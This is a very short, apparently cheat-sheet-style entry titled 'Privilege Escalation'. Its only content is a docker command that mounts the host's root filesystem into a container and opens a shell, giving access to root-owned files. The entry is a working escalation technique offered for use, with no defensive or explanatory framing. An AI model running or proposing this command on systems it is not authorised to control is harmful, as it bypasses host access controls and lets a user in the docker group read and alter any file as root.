# Privilege Escalation

Access root-owned files:

```bash
docker run -it --rm -v /:/host ubuntu bash
```